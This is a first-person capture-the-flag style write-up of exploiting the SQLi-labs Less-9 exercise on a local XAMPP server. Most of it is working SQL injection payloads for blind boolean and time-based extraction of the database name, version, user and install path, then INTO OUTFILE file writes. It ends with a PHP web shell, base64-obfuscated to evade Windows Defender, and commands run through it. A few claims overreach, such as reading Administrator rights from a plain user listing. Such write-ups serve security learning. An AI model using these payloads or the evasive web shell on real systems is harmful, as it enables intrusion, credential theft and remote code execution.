During this lab on response-based time-based SQL injection, I began by fuzzing the `id` parameter to understand how the application handled different inputs. I tested various string termination characters such as `?id=1`, `?id=1'`, and `?id=1"`, and observed that the input `?id=1"` caused the query to break, indicating the possible presence of a SQL injection point involving double quotes. To gain additional context, I viewed the page source using `CTRL + U` via the URL `view-source:http://localhost/sqli-labs-master/Less-9/?id=1`.

Comparing the two responses, I noticed a difference in the size of the returned content: the first response was `965 bytes`, while the second was `1,002 bytes`. Using Burp Suite's Comparer feature, I analyzed these responses side by side and identified that the key difference was the presence of the following HTML snippet in the second response: `<font color= "#0000ff" font size= 3></font>`. This suggested that the application was conditionally including this element depending on the evaluation of the underlying SQL query.
![alt text](<Screenshot 2026-01-29 212925-1.png>)

To confirm this behavior, I tested Boolean-based logic using the payloads `?id=-1" or 1=1--+` and `?id=-1" or 1=2--+`. I observed that the `<font color= "#0000ff" font size= 3>` element appeared only when the condition evaluated to false, i.e., with `?id=-1" or 1=2--+`. This confirmed that the presence of this HTML tag could be used as a reliable indicator of a false condition in the SQL query, effectively providing a response-based side channel for blind SQL injection. Leveraging this, I proceeded to identify the number of columns returned by the original query using the `ORDER BY` technique. I issued payloads such as `-1" order by 1--+` and incremented the column index until the response included the `<font color= "#0000ff" font size= 3>` tag, which signaled that the specified column index was invalid and that I had exceeded the actual number of columns.

After estimating the column count with `ORDER BY`, I validated it using a `UNION`-based approach. I first used the payload `1"+union+select+1,2,3--+` and observed that the response did not contain the `<font color= "#0000ff" font size= 3>` element, indicating that the query executed successfully and that the column count matched. When I increased the number of selected columns with `1"+union+select+1,2,3,4--+`, the `<font color= "#0000ff" font size= 3>` tag reappeared in the response. This confirmed that the underlying query returned exactly 3 columns, and any attempt to select 4 columns caused the query to fail. Through these observations and payloads, I was able to reliably detect the SQL injection point and determine the correct number of columns, setting the stage for further exploitation using union-based or time-based blind techniques.


**Total columns**:

To determine the exact number of columns returned by the SQL query, I employed the `ORDER BY` technique with a binary search approach. I started with a relatively high column index using the payload `-1" order by 10--+`, which immediately returned an our signal `<font color= "#0000ff" font size= 3>`. This confirmed that the query returned fewer than 10 columns. I then reduced the column index to 5 using `-1" order by 5--+`, which again produced the same error signal, indicating that the actual column count was below 5.

Narrowing down further, I tested with a lower value using the payload `-1" order by 2--+`. This time, the query executed without the signal `<font>` tag, which meant that the query successfully ordered by the second column and confirmed that at least 2 columns were being returned. I incremented the column index to 3 with the payload `-1" order by 3--+` and observed the same behavior - no `<font>` tag was returned, suggesting that 3 columns existed in the result set. Finally, I tested with 4 columns using the payload `-1" order by 4--+`, which resulted in an error, confirming that there were only 3 columns being returned by the underlying SQL query. This methodical approach allowed me to pinpoint the exact column count, providing a solid foundation for constructing subsequent `UNION`-based exploitation payloads.

---

**----------------------------------------------------------------------------------**

After confirming the number of columns, I attempted to extract the database name through a manual, character-by-character brute-force process. Although this was a lengthy procedure, I streamlined the approach by using a combination of the `SUBSTRING` function paired with the `IF` condition and `SLEEP` function in MySQL to create time-based blind SQL injection payloads. This allowed me to infer information based on whether the server delayed its response.

I began by determining the length of the database name. I used a binary search methodology with the `LENGTH` function to narrow down the exact character count. Starting with the payload `-1"+union+select+(select+if(length(database())<20,sleep(5),null)),0x00,0x00--+`, the server timed out after 5 seconds, confirming that the database name was shorter than 20 characters. I continued testing with progressively smaller values: `-1"+union+select+(select+if(length(database())<15,sleep(5),null)),0x00,0x00--+` and `-1"+union+select+(select+if(length(database())<10,sleep(5),null)),0x00,0x00--+` both resulted in timeouts. When I tested with `-1"+union+select+(select+if(length(database())<5,sleep(5),null)),0x00,0x00--+`, there was no timeout, indicating the length was 5 or greater. Further refinement with `-1"+union+select+(select+if(length(database())<7,sleep(5),null)),0x00,0x00--+` and `-1"+union+select+(select+if(length(database())<8,sleep(5),null)),0x00,0x00--+` both returned no timeout. However, when I used `-1"+union+select+(select+if(length(database())<9,sleep(5),null)),0x00,0x00--+`, the server timed out. To confirm, I tested the exact length with `-1"+union+select+(select+if(length(database())=8,sleep(5),null)),0x00,0x00--+`, which resulted in a 5-second timeout, and `-1"+union+select+(select+if(length(database())=9,sleep(5),null)),0x00,0x00--+`, which did not timeout. This confirmed that the database name was exactly 8 characters long.

With the length established, I proceeded to brute-force each character of the database name from position 1 to 8 using the `SUBSTRING` function. I tested each character against the entire alphanumeric range (A-Z, a-z, 0-9) as well as common special characters. Starting with the first character, I issued payloads such as `-1"+union+select+(select+if((substring(database(),1,1)='a'),+sleep(5),+null)),2,3--+`, which returned no timeout. I continued with `-1"+union+select+(select+if((substring(database(),1,1)='b'),+sleep(5),+null)),2,3--+` and `-1"+union+select+(select+if((substring(database(),1,1)='c'),+sleep(5),+null)),2,3--+`, both of which also did not cause a delay. I repeated this process for each character position, methodically testing every possible character until I successfully identified all 8 characters. Through this exhaustive enumeration, I determined that the database name was `security`. To confirm this result, I used the payload `-1"+union+select+(select+if((substring(database(),1,8)='security'),+sleep(5),+null)),2,3--+`, which timed out as expected. As a final verification, I deliberately introduced an incorrect character using `-1"+union+select+(select+if((substring(database(),1,8)='securits'),+sleep(5),+null)),2,3--+`, which did not cause a timeout, confirming that my extraction was accurate.

I applied the same methodology to extract the database version and the current user. By iteratively brute-forcing each character position using time-based payloads with the `VERSION()` and `USER()` functions, I successfully enumerated the following information: the database name is `security`, the version is `10.1.38-MariaDB`, and the current user is `root@localhost`. This manual extraction process, while time-consuming, provided a reliable method for extracting sensitive information from the blind SQL injection vulnerability.


**----------------------------------------------------------------------------------**

After successfully extracting the database name, version, and user information, I shifted my focus to file path enumeration to identify the directory structure where I could dump credentials and potentially write files to the server. I leveraged MySQL's `@@basedir` system variable, which specifies the installation directory of the MySQL server. To begin, I needed to determine the length of the string returned by `@@basedir` so I would know how many characters to brute-force. I used the payload `-1" union select if(length((select @@basedir))<20, sleep(5), null), 0x00, 0x00--+` to initiate a binary search for the string length. After conducting a length brute-force and testing common directory drives and paths, I successfully identified the installation path. The final SQL injection payload that confirmed the base directory was `-1" union select if(substring((select @@basedir as fPath),1,14)=CHAR(67, 58, 47, 120, 97, 109, 112, 112, 47, 109, 121, 115, 113, 108), sleep(5), null), 2, 3--+`, which decoded to `C:/xampp/mysql`. To verify this result, I intentionally introduced an incorrect ASCII character code by changing the sequence from `67 58 47 120 97 109 112 112 47 109 121 115 113 108` to `67 58 47 120 97 109 112 112 47 109 121 115 113 109` using the JavaScript snippet `'67 58 47 120 97 109 112 112 47 109 121 115 113 109'.split(' ').join(', ')`. I then issued the payload `-1" union select if(substring((select @@basedir as fPath),1,14)=CHAR(67, 58, 47, 120, 97, 109, 112, 112, 47, 109, 121, 115, 113, 109), sleep(5), null), 2, 3--+`, which resulted in no server timeout, thereby confirming that the MySQL installation path was indeed `C:/xampp/mysql`.

With the file path confirmed, I proceeded to dump the database credentials and enumerate the table structure. First, I needed to identify the table names within the `security` database. I crafted the payload `-1" union select group_concat(table_name), NULL, NULL from information_schema.tables where table_schema='security' INTO OUTFILE 'C:/xampp/htdocs/tbl_name.txt'--+`, which wrote the concatenated table names to a file on the web server. I then navigated to `http://localhost/tbl_name.txt` and retrieved the following table names: `emails,referers,uagents,users`. Next, I applied the same technique to enumerate the columns within the `users` table using the payload `-1" union select group_concat(column_name), NULL, NULL from information_schema.columns where table_name='users' INTO OUTFILE 'C:/xampp/htdocs/col_names.txt'--+`. After visiting `http://localhost/col_names.txt`, I obtained the column names: `USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password`. This information provided me with the complete schema necessary to extract user credentials and further exploit the application.

Having enumerated the database structure and confirmed my ability to write files to the web server, the final step was to achieve code execution by uploading a web shell. I started with a basic PHP reverse shell using the code `<?php system($_GET['cmd']); ?>`. I injected this payload using the SQL query `-1" union select "<?php system($_GET['cmd']); ?>", NULL, NULL from users INTO OUTFILE 'C:/xampp/htdocs/web_shell.php'--+`. The SQL query executed successfully, and I navigated to `http://localhost/web_shell.php` expecting to access the shell. However, I encountered a 404 error, indicating that the file was not accessible. The most likely explanation was that the file had been flagged as malicious and removed by Windows Defender or another antivirus solution running on the server. To bypass this detection, I needed to obfuscate the payload to alter its signature. I created an obfuscated version of the PHP shell using Base64 encoding: `<?php eval(base64_decode('CiBlY2hvICJceDNjXHg3MFwxNjJceDY1XDc2IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWyJceDYzXDE1NVx4NjQiXSkgLiAiXHgzY1w1N1wxNjBcMTYyXHg2NVw3NiI7IA==')); ?>`. I then injected this obfuscated payload with the SQL query `-1" union select "<?php eval(base64_decode('CiBlY2hvICJceDNjXHg3MFwxNjJceDY1XDc2IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWyJceDYzXDE1NVx4NjQiXSkgLiAiXHgzY1w1N1wxNjBcMTYyXHg2NVw3NiI7IA==')); ?>", 0x00, 0x00 from users INTO OUTFILE 'C:/xampp/htdocs/obf_web_shell.php'--+`. After the query completed, I visited `http://localhost/obf_web_shell.php?cmd=whoami` and successfully received the response `anoncoderh4ck3r\217da`, confirming that the web shell was functioning and that I had achieved code execution on the server. To verify my privilege level, I executed the command `http://localhost/obf_web_shell.php?cmd=net user`, which returned the following output:

```bash
User accounts for \\ANONCODERH4CK3R


-------------------------------------------------------------------------------
217da                    Administrator            DefaultAccount           
Guest                    HuzefaOracleDB           WDAGUtilityAccount
```    

The command completed successfully. This output confirmed that the current user 217da had Administrator privileges, meaning there was no need for privilege escalation. With full administrative access to the server, I had successfully compromised the system through SQL injection, file enumeration, credential dumping, and ultimately achieving remote code execution via an obfuscated web shell.

Thanks for reading :)